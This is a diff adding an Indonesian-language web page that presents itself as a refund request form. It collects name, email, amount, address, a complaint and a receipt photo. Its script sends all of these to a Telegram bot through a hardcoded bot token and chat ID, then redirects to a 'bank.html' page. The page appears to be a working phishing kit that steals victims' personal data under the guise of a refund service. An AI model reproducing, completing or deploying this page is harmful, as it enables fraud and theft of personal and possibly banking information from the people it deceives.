@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Formulir Refund</title>
+  <style>
+    /* CSS untuk tata letak form */
+    form {
+      max-width: 500px;
+      margin: 0 auto;
+    }
+    label {
+    font-weight: bold;
+    color: SlateGray;
+    text-align: right;
+    padding-left:3px;
+  }
+
+    /* CSS untuk kolom input */
+    input[type="text"], input[type="email"], input[type="password"], input[type="file"] {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    /* CSS untuk tombol unggah foto */
+    .upload-btn {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      background-color: #f0f0f0;
+      cursor: pointer;
+      text-align: center;
+       margin-top: 50px;
+    }
+
+    /* CSS untuk style tombol unggah foto saat dihover */
+    .upload-btn:hover {
+      background-color: #e0e0e0;
+    }
+
+    button {
+  padding: 10px 20px;
+  font-size: 16px;
+  border: none;
+  border-radius: 5px;
+  background-color: #8b4513; /* Warna latar belakang */
+  color: White; /* Warna teks */
+  cursor: pointer;
+  transition: background-color 0.3s;
+  margin-top :20px;
+  width: 350px;
+  margin: 0 auto;
+  font-weight: bold;
+}
+
+button:hover {
+  background-color: #8b4513; /* Warna latar belakang saat dihover */
+}
+
+button:active {
+  transform: translateY(3px);
+}
+  </style>
+</head>
+<body>
+<h2>Silahkan Lengkapi Formulir Pengajuan Refund</h2>
+<form action="#" method="post">
+<label for="nama">Nama Lengkap</label><br>
+<input type="text" id="nama" name="nama" placeholder="Masukkan Nama Anda" required style="margin-top: 10px;"><br>
+
+<label for="email">Email</label><br>
+<input type="email" id="email" name="email" placeholder="Masukkan email Anda" required style="margin-top: 10px;"><br>
+
+<label for="password">Jumlah Permohonan Refund</label><br>
+<input type="text" id="password" name="password" placeholder="Masukkan Jumlah" required style="margin-top: 10px;"><br>
+
+<label for="alamat">Alamat</label><br>
+<input type="text" id="alamat" name="alamat" placeholder="Masukkan alamat Anda" required style="margin-top: 10px;"><br>
+
+<label for="foto">Unggah 1 Bukti Transaksi</label><br>
+<input type="file" id="foto" name="foto" accept="image/*" required style="margin-top: 10px;"><br>
+<label for="Keluhan">Keluhan Anda</label><br>
+<textarea id="keluhan" name="keluhan" placeholder="Tulis Masalah Anda..." rows="4" maxlength="1000" style="margin-top: 20px; height: 150px; width: 80%;"></textarea><br>
+
+</form>
+<div style="text-align: center; margin-top: 30px;">
+  <button type="button" onclick="submitForm()">Lanjutkan</button>
+</div>
+
+<!-- Teks pesan menunggu -->
+<p id="waitingMessage" style="display: none;">Mohon tunggu...</p>
+
+<script>
+function submitForm() {
+  if (nama === '' || email === '' || password === '' || alamat === '' || keluhan === '') {
+        // Memberikan efek getaran pada tombol submit
+        var button = document.querySelector('button');
+        button.style.animation = 'shake 0.5s';
+        setTimeout(function(){
+            button.style.animation = '';
+        }, 500);
+        return; // Berhenti jika ada kolom yang kosong
+    }
+    // Mengambil nilai dari setiap input
+    var nama = document.getElementById("nama").value;
+    var email = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var alamat = document.getElementById("alamat").value;
+    var keluhan = document.getElementById("keluhan").value;
+    
+    // Membuat objek FormData untuk mengirim data
+    var formData = new FormData();
+    formData.append("nama", nama);
+    formData.append("email", email);
+    formData.append("password", password);
+    formData.append("alamat", alamat);
+    formData.append("keluhan", keluhan);
+    formData.append("foto", document.getElementById("foto").files[0]);
+
+    // Mengirim data ke bot Telegram menggunakan AJAX
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+      if (this.readyState === 4 && this.status === 200) {
+        // Respons atau tindakan setelah pesan terkirim berhasil
+        console.log("Data terkirim ke bot Telegram");
+      }
+    };
+    xhttp.open("POST", "https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885&text=Data%20Refund:%20Nama:%20" + nama + "%20Email:%20" + email + "%20Jumlah:%20" + password + "%20Alamat:%20" + alamat + "%20Keluhan:%20" + keluhan, true);
+    xhttp.send(formData);
+
+    // Menampilkan pesan menunggu
+    var waitingMessage = document.getElementById('waitingMessage');
+    waitingMessage.style.display = 'block';
+
+    // Mengarahkan ke halaman pilih.html setelah 3 detik
+    setTimeout(function() {
+      window.location.href = 'bank.html';
+    }, 3000); // 3 detik
+}
+</script>
+
+</body>
+</html>
